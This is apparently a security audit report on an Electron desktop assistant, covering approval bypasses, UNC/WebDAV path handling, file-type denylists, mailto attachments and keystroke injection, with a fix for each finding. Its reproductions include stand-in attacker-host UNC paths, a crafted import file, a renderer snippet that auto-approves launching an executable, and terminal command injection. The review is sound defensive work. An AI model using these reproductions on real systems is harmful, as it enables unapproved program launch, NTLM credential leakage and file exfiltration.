# Native and IPC security review — Desktop Companion

Status: review of the Electron main, preload, services and PowerShell helpers at commit `c9c3f8a`. No source was changed. Technical names (`jarvis:*` channels, `JarvisAPI`, `jarvis-export`) are kept as they appear in code.

Scope: IPC trust, path scopes, preview/execute approvals, offline/cloud egress protection, secret handling, native helpers (`electron/**`, `native/*.ps1`).

## Method and evidence

- Read every file under `electron/` and `native/`, plus `src/shared/contracts.ts`, `index.html`, `package.json` and the approval flow in `src/components/Computer.tsx`.
- Ran one offline Node probe (`--experimental-strip-types`) against `electron/services/paths.ts` and the WHATWG `URL` parser, in a unique temp directory that was removed afterwards. Probe output used below:

```
"//./pipe/demo"                            => {"path":"\\\\.\\pipe\\demo"}               (device-path check bypassed)
"\\\\attacker.example\\share\\payload.exe" => {"path":"\\\\attacker.example\\share\\payload.exe"}   (UNC accepted)
"\\\\attacker.example@SSL\\DavWWWRoot\\x.exe" => accepted                               (WebDAV UNC accepted)
"\\\\.\\pipe\\demo"                        => {"error":"Device paths are not allowed"}
C:\r\a.chm / disk.iso / x.settingcontent-ms / pkg.msix / x.library-ms => dangerous: false
C:\r\x.exe                                  => dangerous: true
isDriveRoot("\\\\attacker.example\\share\\folder") => false                             (UNC folder allowed as root)
mailto href keeps "?attach=C:\Users\u\Documents\secret.docx"
file:///C:/app/dist/index.html vs file://evil-host/C:/app/dist/index.html => same pathname, host ignored
```

- Not executed: anything needing network, SMB, a real window or desktop input. Where a finding depends on Windows behaviour (UNC opens contact SMB/WebDAV, ShellExecute file-type handlers), the reproduction gives the steps but they were not run against a live host.

## Threat model used

| Attacker | Example entry point |
|---|---|
| A. Malicious data the user imports | A shared "capsule pack" or `jarvis-export` JSON opened with Import |
| B. Script running in the renderer | XSS, a compromised dependency, the unpackaged dev server |
| C. Remote host | UNC/WebDAV path in a target, `mailto:` handler behaviour |
| D. Same-user local process | Out of scope for most issues; noted where it changes severity |

## Summary

| ID | Severity | Area | Title |
|---|---|---|---|
| NSR-01 | High | Approvals, import | Import replaces security settings; capsule restore then launches with no preview |
| NSR-02 | High | Approvals, IPC | Approval and permission grants are asserted by the renderer only |
| NSR-03 | High | Path scopes, offline | UNC/WebDAV paths accepted: offline egress, NTLM leak, remote executable launch |
| NSR-04 | Medium | Path scopes | Device-path check bypassed with forward slashes (`//./pipe/x`) |
| NSR-05 | Medium | Path scopes | Executable-type denylist misses code-running file types |
| NSR-06 | Medium | Approvals | `mailto:` URLs keep `attach=` and other parameters |
| NSR-07 | Medium | Approvals, native | `type-text` approval hides the text; terminals are valid targets; 16-char focus race |
| NSR-08 | Medium-Low | Approvals | Bare-name approved apps resolved from PATH at execute time; not shown or re-checked |
| NSR-09 | Low | Safe launch | Capsule window moves ignore safe launch; restore is not rate limited |
| NSR-10 | Low | IPC trust | `isTrustedUrl` ignores the file URL host; all `file:` requests allowed |
| NSR-11 | Low | IPC trust | Dev-server origin taken from env without a loopback check |
| NSR-12 | Low | Offline | Renderer can point the local endpoint at any loopback service |
| NSR-13 | Low/Info | Secrets, native | DPAPI via PowerShell with no script integrity check; differs from architecture doc |

Suggested fix order: NSR-02 (one main-process confirmation fixes most of the approval chain), NSR-01, NSR-03 + NSR-04 (one `normalizeAbsolutePath` change), then NSR-05 to NSR-08.

## Findings

### NSR-01 (High) — Import replaces security settings; capsule restore then launches with no preview

Where:
- `electron/services/store.ts:267` — `importDocument` replaces `d.settings` wholesale.
- `electron/services/validation.ts:157-165` — `fullSettings` accepts `approvedApps`, `allowedRoots`, `mode`, `localEndpoint` from the file.
- `electron/backend.ts:188-200` — `importData` logs only "Imported data"; it does not list the permissions that changed.
- `electron/services/actions.ts:283-294` — `openItem` treats "restore" as the approval and shows no preview.
- `electron/services/capsules.ts:40-44` — every capsule item goes through `openItem`.

Reproduction (attacker A):
1. Write a file that passes `parseEnvelope`/`parseState`:
   `{"format":"jarvis-export","schemaVersion":1,"state":{"settings":{"mode":"online","approvedApps":["C:\\Users\\<u>\\Downloads\\tool.exe"],"allowedRoots":["C:\\Users\\<u>\\Downloads"]},"capsules":[{"id":"c1","name":"Morning setup","description":"","scene":"graphite","createdAt":"2026-10-01T00:00:00Z","updatedAt":"2026-10-01T00:00:00Z","items":[{"kind":"app","target":"tool.exe","label":""},{"kind":"url","target":"https://example.com/","label":""}]}],"notes":[],"tasks":[]}}`
2. The user imports it from Settings (one native file dialog), then clicks Restore on "Morning setup".
3. `tool.exe` is spawned and the URL opens, with no preview and no approval. `mode` is now `online`, so if a cloud key is stored the next chat goes to the cloud, even though the user never switched modes.

Fix:
- In `importDocument`, keep the current `approvedApps`, `allowedRoots`, `mode`, `localEndpoint` and `cloudModel` unless the user confirms them in a main-process dialog (`dialog.showMessageBox`) that lists every added app, folder and the mode change. Always force `mode: 'offline'` after an import.
- Log the permission diff in the activity entry.
- Before `restoreCapsule` opens anything, show one main-process confirmation that lists every item (kind plus resolved target), the same way as NSR-02.

### NSR-02 (High) — Approval and permission grants are asserted by the renderer only

Where:
- `electron/services/actions.ts:209-243` — `execute(previewId, approved)` trusts the `approved` boolean that arrives over IPC.
- `electron/preload.ts:24-25` — exposes `previewAction` and `executeAction` directly.
- `electron/backend.ts:92-102` — `saveSettings` widens `approvedApps` and `allowedRoots` and turns on `mode: 'online'` with no confirmation.
- No minimum preview age: a preview can be executed in the same tick it was created.

Reproduction (attacker B; in an unpackaged build, DevTools is enough):
```js
await jarvis.saveSettings({approvedApps: ['C:\\Users\\<u>\\Downloads\\x.exe']});
const p = await jarvis.previewAction({type: 'launch', target: 'x.exe'});
await jarvis.executeAction(p.id, true);   // spawns x.exe; no human saw anything
```
The same pattern works for `type-text` into a terminal (NSR-07).

Impact: the preview → approve → execute control is only as strong as the renderer. Existing mitigations (sandbox, context isolation, CSP `script-src 'self'`, React text escaping, sender checks) mean there is no known injection today, so this is High rather than Critical. But any future XSS or dependency compromise turns into arbitrary executable launch and keystroke injection.

Fix:
- In `ActionService.execute`, when `approved === true` and `requiresApproval`, show a main-process `dialog.showMessageBox(mainWindow, {type: 'warning', message: summary, detail: <full target / resolved path / full text>, buttons: ['Cancel', 'Run'], defaultId: 0, cancelId: 0})` and run only on "Run". Inject it as a `confirm(summary, detail)` dependency so tests can stub it.
- In `saveSettings`, compare old and new settings. If `approvedApps` or `allowedRoots` gain entries, or `mode` becomes `online`, or `localEndpoint` changes, show a main-process confirmation; if the user cancels, throw and leave state unchanged.
- Also refuse to execute a preview younger than about 500 ms, and refuse when `mainWindow.isFocused()` is false. This makes automated approval harder.

### NSR-03 (High) — UNC/WebDAV paths accepted: offline egress, NTLM leak, remote executable launch

Where:
- `electron/services/paths.ts:20-36` — `normalizeAbsolutePath` accepts `\\host\share\...` (probe confirms; WebDAV `\\host@SSL\DavWWWRoot\...` too).
- `electron/services/paths.ts:81` — `fs.realpath(target)` runs before the allowed-roots check (`:93-107`), so the network is contacted even for targets outside the roots (only `allowedRoots.length > 0` is required, `:78`).
- `electron/services/validation.ts:95-102` — `validateApprovedApp` accepts a UNC `.exe`.
- `electron/services/validation.ts:129-137` — UNC folders are accepted as allowed roots; `isDriveRoot` only rejects `\\host\share` itself (probe: `\\host\share\folder` → false).
- `electron/services/actions.ts:51-56` and `electron/main.ts:61-62` — a UNC approved app is `stat`ed and then spawned.
- `electron/services/netGuard.ts:1` says it is "the ONLY egress path", but filesystem access to UNC paths bypasses it, and so does offline mode.

Reproduction (attackers A/B/C; not run, because it needs network):
1. Any allowed root configured. Renderer calls `previewAction({type: 'launch', target: '\\\\attacker.example\\s\\x'})`, or an imported capsule item has that target and the user clicks Restore. `realpath` opens the UNC path, and Windows connects over SMB (445) or falls back to WebDAV over HTTP, sending NTLM credentials automatically, while the app reports offline mode.
2. `saveSettings({approvedApps: ['\\\\attacker.example\\s\\tool.exe']})` (or an import, NSR-01), then launch `tool.exe`: a remote binary runs.

Fix:
- In `normalizeAbsolutePath`, reject any path that starts with `\\` or `//` after slash normalization (see NSR-04). Accept only `X:\...` local drive paths. If UNC support is ever wanted, add it as an explicit setting that is blocked in offline mode.
- In `resolveInsideRoots`, do a lexical containment check against the lexically normalized roots before any filesystem call. Then call `realpath` and check again (the existing check).
- Correct the `netGuard.ts` header, or add a test that all filesystem targets are local drive paths.

### NSR-04 (Medium) — Device-path check bypassed with forward slashes

Where: `electron/services/paths.ts:26`. The regex `^\\\\[?.]\\` only matches backslashes. `//?/...` is later caught by the `?` character check (`:32`), but `//./...` is not.

Reproduction (probe, confirmed): `normalizeAbsolutePath('//./pipe/demo')` → `{path: '\\\\.\\pipe\\demo'}`. Then `resolveInsideRoots` calls `realpath` on it (`:81`). This opens a named pipe or device (`//./pipe/x`, `//./COM1`, `//./PhysicalDrive0`) before rejecting it as "not a regular file". Connecting to a pipe lets that pipe server impersonate the app's token. Opening a device that blocks can also stall the main-process libuv pool.

Fix: start `normalizeAbsolutePath` with `raw = input.trim().replace(/\//g, '\\')`, then run every existing check, and the NSR-03 `^\\\\` rejection, on the normalized string. Add tests for `//./pipe/x`, `\/.\x` and `/\?\C:\x`.

### NSR-05 (Medium) — Executable-type denylist misses code-running file types

Where: `electron/services/paths.ts:9-12` (`DANGEROUS_EXT`), used at `:101-103`; files then open via `shell.openPath` (`electron/services/actions.ts:259-262`, `electron/main.ts:60`).

Reproduction (probe, confirmed lexically): `.chm`, `.iso`, `.settingcontent-ms`, `.msix`, `.library-ms` are all "not dangerous". A file of any of these types inside an allowed root (Downloads is a likely root) opens through ShellExecute. That can run script (`.chm`), mount a disk image (`.iso`/`.img`/`.vhd`/`.vhdx`, which historically bypassed Mark of the Web), start an installer (`.msix`/`.appx`/`.appxbundle`/`.msixbundle`/`.appinstaller`), or reach a remote location (`.library-ms`/`.search-ms`/`.searchConnector-ms`, `.scf`, `.theme`/`.themepack`). Others missing: `.wsc`, `.sct`, `.xll`, `.inf`, `.diagcab`, `.cab`, `.website`, `.ps1xml`, `.psd1`, `.psc1`, `.mht`/`.mhtml`, `.xbap`, `.ocx`, `.sys`, `.drv`, `.mde`, `.accde`, `.ws`, `.msh*`.

Fix: replace the denylist with an allowlist of document and media types (for example `.txt .md .pdf .rtf .csv .json .log .docx .xlsx .pptx .odt .ods .odp .png .jpg .jpeg .gif .webp .bmp .svg .mp3 .wav .m4a .mp4 .mkv .webm .zip`). Folders are still allowed. Any other file type must go through `approvedApps`. Add a test for each rejected example above.

### NSR-06 (Medium) — `mailto:` URLs keep `attach=` and other parameters

Where: `electron/services/policy.ts:52` returns `u.href` unchanged for `mailto:`.

Reproduction (probe, confirmed): `mailto:a@example.com?attach=C:\Users\u\Documents\secret.docx` passes, and the href keeps `attach=`. Some mail handlers honour `attach`/`attachment` and add the local file to a draft, so the file is exfiltrated if the user sends it. Through a capsule item (NSR-01) this opens without a preview.

Fix: parse the recipients from `u.pathname`, keep only `subject`, `body`, `cc` and `bcc` from `u.searchParams`, rebuild the URL, and reject it if any other parameter was present. Put the rebuilt URL in the summary.

### NSR-07 (Medium) — `type-text` approval hides the text; terminals are valid targets; focus race

Where:
- `electron/services/actions.ts:142-148` — the authoritative summary is "Type N characters into …". The text itself is not in the main-process summary.
- `electron/services/policy.ts:26` allows `\n` and `\t`. `policy.ts:138-147` has no process restrictions.
- `native/common.ps1:171-190` — `TypeText` checks the foreground window once per 16-character chunk, then sends the whole chunk.

Reproduction (in combination with NSR-02): `previewAction({type: 'type-text', target: 'hwnd:<powershell window>', text: 'Start-Process calc\n'})`, then `executeAction(id, true)`. The command runs in the terminal. A user who approves sees only "Type 19 characters".

Fix:
- Put the text in the approval: the first 200 characters with visible `⏎`/`⇥` markers in `summary`, and the full text in the NSR-02 main-process dialog.
- Deny `type-text` containing `\n`/`\r` (or require a second, explicit confirmation) when the target process is `cmd.exe`, `powershell.exe`, `pwsh.exe`, `WindowsTerminal.exe`, `OpenConsole.exe`, `conhost.exe`, `wt.exe`, `bash.exe`, `wsl.exe` or `mintty.exe`, or when the window is the `explorer.exe` Run dialog.
- In `TypeText`, re-check the foreground window before every `SendInput` call of at most 1–4 units, so that at most a few characters can reach a window that took focus.

### NSR-08 (Medium-Low) — Bare-name approved apps resolved from PATH at execute time

Where:
- `electron/services/actions.ts:51-66` — `resolveExecutable` searches System32, then SystemRoot, then every `PATH` entry.
- `electron/services/actions.ts:253-257` — resolution happens in `perform`, after revalidation.
- `electron/services/policy.ts:76-77` — the `launch-app` plan holds only `entry`, so `revalidate` (`actions.ts:188-193`) cannot detect a change to the resolved file.
- `electron/services/actions.ts:111` — the summary shows `entry`, not the file that will run.

Reproduction (attacker D): `approvedApps: ['code.exe']` (not in System32). An earlier user-writable `PATH` directory that contains a planted `code.exe` wins. The preview says "Start approved app code.exe", and the file can also change between preview and execute.

Fix: resolve in `evaluate()` and store the absolute path in the plan (`{kind: 'launch-app', entry, exe}`), so the existing JSON comparison catches changes. Show `exe` in the summary and spawn exactly that path. Limit bare-name lookup to `%SystemRoot%\System32`, `%SystemRoot%`, `%ProgramFiles%` and `%ProgramFiles(x86)%`, or resolve bare names to absolute paths when settings are saved.

### NSR-09 (Low) — Capsule window moves ignore safe launch; restore is not rate limited

Where:
- `electron/services/capsules.ts:46-77` calls `native.moveWindow` (`:65`) without checking safe launch. Only `openItem` checks it (`actions.ts:285`).
- `electron/main.ts:179` tells the user "Desktop actions are disabled".
- `MAX_ACTIONS_PER_MINUTE` applies only in `execute` (`actions.ts:225`). A renderer loop of `restoreCapsule` can launch up to 100 items per call, without limit.

Reproduction: start in safe launch (two unclean exits), then restore a capsule that has saved windows. The matching windows are still moved.

Fix: add `safeLaunch` to `CapsuleDeps` and return before items and windows when it is active. Count each opened item and moved window against the shared rate limiter, and allow at most one restore every few seconds.

### NSR-10 (Low) — `isTrustedUrl` ignores the file URL host; all `file:` requests allowed

Where:
- `electron/ipcCore.ts:10-14` compares only the decoded pathname (probe: `file://evil-host/C:/app/dist/index.html` gives the same pathname as the app URL).
- The same check gates navigation (`electron/main.ts:99`).
- `electron/main.ts:127` allows every `file:` request, including `file://host/share/...`, so with any HTML injection the renderer could start SMB egress in offline mode.

Direct exploitation of the host gap is unlikely (share names cannot contain `:`), so this is Low.

Fix:
- Require `u.host === ''` (and `a.host === ''`) in `isTrustedUrl`.
- In `onBeforeRequest`, allow only `file:` URLs with an empty host whose decoded path is inside the `dist` directory.
- Longer term, serve the UI from a custom `app://` scheme with `protocol.handle` and path confinement. This also stops CSP `'self'` from matching arbitrary `file:` URLs.

### NSR-11 (Low) — Dev-server origin taken from env without a loopback check

Where: `electron/main.ts:15`, `:31`, `:122-127`. In an unpackaged build, `VITE_DEV_SERVER_URL=http://any-host:port` makes that origin trusted for IPC and allowed through `onBeforeRequest`.

Fix: accept `DEV_URL` only when it is `http:` and `isLoopbackHost(hostname)`; otherwise ignore it and log a warning.

### NSR-12 (Low) — Renderer can point the local endpoint at any loopback service

Where: `electron/services/validation.ts:81-93` and `electron/services/netGuard.ts:32-34`. Any loopback port is accepted, so chat history is POSTed to `<endpoint>/api/chat` on whatever local service listens there. Requests are limited to fixed paths, so this is Low.

Fix: confirm endpoint changes (NSR-02). Before sending chat content, check that `GET /api/version` returns an Ollama-shaped response.

### NSR-13 (Low/Info) — DPAPI via PowerShell with no script integrity check

Where:
- `electron/services/secrets.ts:52-69` and `native/dpapi.ps1` use DPAPI CurrentUser with a fixed, public entropy string. Every `reveal` spawns PowerShell (`electron/services/chat.ts:112`) and the plaintext key comes back over the child's stdout.
- `electron/native/runner.ts:37-39` runs unpacked scripts with `-ExecutionPolicy Bypass` and does not verify them.
- `package.json:55` lets the user install to any directory. If that directory is writable by other users, one of them can replace `dpapi.ps1` and capture the key.
- `docs/architecture.md:15` specifies Electron `safeStorage`; the implementation differs.

Any same-user process can decrypt `secrets/cloud-key.bin`. That is inherent to DPAPI and acceptable.

Fix:
- Use `safeStorage.encryptString`/`decryptString` in the main process: there is no child process, and it matches the architecture doc. Keep the PowerShell path only as a fallback.
- Embed SHA-256 hashes of `native/*.ps1` at build time and check them in `NativeRunner.run` before each spawn.

## Controls verified as working (no finding)

- Renderer: `contextIsolation`, `sandbox`, no Node integration, window open denied, `<webview>` blocked, permission handler grants app-origin audio only (`electron/main.ts:85-137`).
- IPC: main-frame and trusted-URL sender check, closed method list, arity check, error text redaction (`electron/ipcCore.ts:32-42`, `electron/ipc.ts:9`). `Secrets.reveal` is not reachable over IPC (`electron/channels.ts:2-9`).
- Approvals: previews are single-use (consumed even on decline or denial), expire after 60 s, are capped at 100, and policy is re-evaluated at execute time. Window actions re-check hwnd, PID and process name. Elevated or unknown-integrity windows are refused in both TypeScript and PowerShell. Password fields are refused. Clicks must be inside the window and not covered (`electron/services/actions.ts`, `native/*.ps1`).
- Path scopes: `..`, ADS, `\\?\`/`\\.\` (backslash form), control characters and drive-relative paths are rejected. Symlinks and junctions are resolved before the containment check (`electron/services/paths.ts`).
- Native: `execFile` without a shell, fixed argv, JSON input on stdin only, output size and time limits, concurrency cap (`electron/native/runner.ts`).
- Egress: the cloud origin is pinned, offline mode blocks it, a key is required, `redirect: 'error'` is set, and loopback is restricted to the `ollama` purpose (`electron/services/netGuard.ts`).
- Secrets: the key is never in `AppState`, exports or backups. Only ciphertext is written to disk.

## Limitations of this review

- No live network, SMB, ShellExecute or desktop-input tests were run. NSR-03, NSR-05 and NSR-06 rely on documented Windows and mail-client behaviour.
- The renderer was checked only for how it calls approvals (`src/components/Computer.tsx:114-148`); it was not audited for injection.
- `node_modules` is not installed in this worktree, so the existing test suite was not run.
